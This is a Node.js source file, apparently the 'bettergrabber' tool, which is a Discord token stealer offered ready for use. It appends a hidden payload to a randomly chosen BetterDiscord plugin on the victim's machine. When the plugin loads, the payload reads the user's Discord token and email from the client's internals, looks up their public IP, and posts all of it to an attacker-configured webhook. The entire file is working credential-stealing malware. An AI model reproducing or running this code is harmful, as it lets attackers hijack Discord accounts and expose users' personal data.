// https://github.com/Infinixius/bettergrabber
// spaghetti code incoming
const fs = require("fs")
const bdfolder = process.env.APPDATA+"\\BetterDiscord"
var webhook = ""
if (!webhook){throw "Please provide a webhook on line 3."}
const payload = `
require("request").get("https://api.ipify.org", async (err, res, body) => {
  const options = {
    method: 'POST',
    url: '${webhook}',
    headers: {'Content-Type': 'application/json'},
    body: {
        "embeds": [
        {
          "title": document.getElementsByClassName("size14-e6ZScH title-eS5yk3")[0].innerText+document.getElementsByClassName("size12-3cLvbJ subtext-3CDbHg")[0].innerText+" logged",
          "description": "**Token** \`\`\`"+Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken()+"\`\`\`**IP** \`\`\`"+body+"\`\`\`**Email** \`\`\`"+Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail()+"\`\`\`",
          "color": null
        }
      ]
    },
    json: true,
    jar: 'JAR'
  };
require("request")(options, async (err, res, body) => {
    if (err) throw err
});
    if (err) throw err
});
`

fs.readFile(bdfolder+"\\bdstorage.json", "utf8",  function (err,data) {
    if (err) {
        console.log(err)
    } else {
        var files = fs.readdirSync(bdfolder+"\\plugins", { withFileTypes: true })
            .filter(dirent => dirent.isFile())
            .filter(dirent => dirent.name.endsWith(".plugin.js"))
            .map(dirent => dirent.name)
        let items = Array.from(files)
        const file = items[Math.floor(Math.random() * items.length)]
        fs.readFile(bdfolder+"\\plugins\\"+file, function(err, buf) {
            var data = buf.toString()

            fs.writeFile(bdfolder+"\\plugins\\"+file, data+"\n"+payload, (err) => {
                console.log(file)
                if (err) throw err; 
            }) 
        });
    }
})